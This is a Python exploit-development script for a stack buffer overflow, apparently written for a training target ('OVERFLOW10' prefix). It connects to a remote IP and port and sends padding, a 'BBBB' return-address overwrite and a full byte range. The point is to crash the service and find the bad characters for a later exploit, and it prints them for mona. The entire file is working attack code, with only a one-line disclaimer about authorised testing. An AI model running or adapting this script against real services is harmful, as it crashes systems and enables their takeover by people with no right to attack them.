#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
	if eip_offset > overflow_threshold:
		print("The value of the offset cannot be bigger than the overflow threshold")
		sys.exit(0)
	
	# Define prefix and buffer with encoded cyclic pattern
	prefix = b"OVERFLOW10 "	# CHANGE
	buffer = b"A" * eip_offset
	eip = b"B" * 4
	all_characters = bytearray(range(1, 256))
	bad_characters = [  # CHANGE
		#b'\x04',
		#b'\x3e',
		#b'\xe1'
	]

	payload = b""

	for bad_char in bad_characters:
		all_characters = all_characters.replace(bad_char, b"")

	payload_size = eip_offset + len(eip) + len(all_characters) + len(bad_characters)

	if payload_size > overflow_threshold:
		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip) + len(all_characters) + len(bad_characters))
		sys.exit(0)

	suffix = b"C" * (overflow_threshold - payload_size)

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				response = s.recv(4096)
				print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					all_characters,
					suffix
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(f"Application crashed at {len(payload) - len(prefix)} bytes! ({len(bad_characters)} bad characters)" )
		if len(bad_characters) > 0:
			hex_string = '\\x'.join('{:02x}'.format(b) for b in b''.join(bad_characters))
			print(f"For mona: {hex_string}")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Bad Characters",
		description="""This is a Python script for finding what bad characters exists that cannot be interpreted by the target application running on the remote server. 
	The script takes four arguments: an IP address, a port number, the EIP offset and an overflow threshold. After executing the script the EIP register should be populated with 42424242.
	The user should inspect the call stack and try to identify what characters are bad. This should be an iterative process and you should run this script with different sets characters to build your bad character list.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold))